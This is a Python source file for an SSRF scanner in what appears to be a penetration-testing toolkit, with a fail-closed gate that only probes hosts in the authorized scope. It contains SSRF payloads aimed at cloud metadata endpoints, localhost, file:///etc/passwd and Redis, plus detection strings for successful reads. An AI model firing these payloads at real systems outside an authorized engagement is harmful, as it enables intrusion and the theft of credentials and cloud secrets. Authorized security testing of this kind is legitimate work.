"""SSRF engine -- now SCOPE-GATED (fail-closed).

Previously this sent probes (incl. cloud-metadata 169.254.169.254, localhost, file://, redis) to any
target with NO scope check at all -- the worst of the ungated engines. Every request now routes through
tools.gate_guarded_request, which loads the session's AUTHORIZED scope from a trusted env channel
(SABRINA_ACTIVE_SCOPE_FILE / SABRINA_ACTIVE_SCOPE_JSON) -- never a caller argument -- and refuses any
out-of-scope host. With no authorized scope configured it FAILS CLOSED (sends nothing). So this engine
can never touch a host outside the active engagement.
"""

import json
import os
import sys

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from tools.gate_guarded_request import gate_guarded_request as ggr, is_url_allowed  # noqa: E402

# Enhanced payload list covering common SSRF vectors
PAYLOADS = [
    "http://127.0.0.1:80",
    "http://localhost:80",
    "http://169.254.169.254/latest/meta-data/",  # AWS Metadata
    "http://169.254.169.254/metadata/v1/",       # GCP/Azure Metadata
    "http://[::1]:80",                           # IPv6 Loopback
    "http://0.0.0.0:80",
    "file:///etc/passwd",                        # Local File Inclusion via SSRF
    "dict://127.0.0.1:6379/info"                 # Redis exploitation
]


def is_vulnerable(response):
    """Analyzes response for signs of SSRF success."""
    if not response:
        return False
    indicators = [
        "root:x:0:0:",          # /etc/passwd
        "instance-id",          # AWS Metadata
        "local-hostname",       # Cloud Metadata
        "redis_version",        # Redis
        "Welcome to nginx"      # Local service detection
    ]
    if response.status_code == 200:
        for indicator in indicators:
            if indicator in response.text:
                return True
    return False


def scan(target_url, timeout=5):
    """Gated SSRF scan. The target must be in the session's authorized scope or NOTHING is sent.
    Returns {"scanned": False, "blocked_reason": ...} when the gate refuses (out-of-scope target or no
    authorized scope configured) -- so an out-of-scope call never emits a probe."""
    allowed, reason = is_url_allowed(target_url)
    if not allowed:
        return {"target": target_url, "vulnerable": False, "findings": [],
                "scanned": False, "blocked_reason": reason}

    results = {"target": target_url, "vulnerable": False, "findings": [], "scanned": True}
    headers = {"User-Agent": "SSRF-Scanner/1.0"}
    for payload in PAYLOADS:
        test_url = f"{target_url}?url={payload}"
        try:
            # ggr re-checks the URL against the trusted scope and returns None if blocked.
            response = ggr("GET", test_url, timeout=timeout, allow_redirects=True, headers=headers)
            if is_vulnerable(response):
                results["vulnerable"] = True
                results["findings"].append({"payload": payload, "status": "Confirmed"})
        except requests.exceptions.RequestException:
            continue  # skip connection errors during scanning
    return results


def main():
    if len(sys.argv) < 2:
        print("Usage: python ssrf_engine.py <target_url>")
        sys.exit(1)
    print(json.dumps(scan(sys.argv[1]), indent=4))


if __name__ == "__main__":
    main()
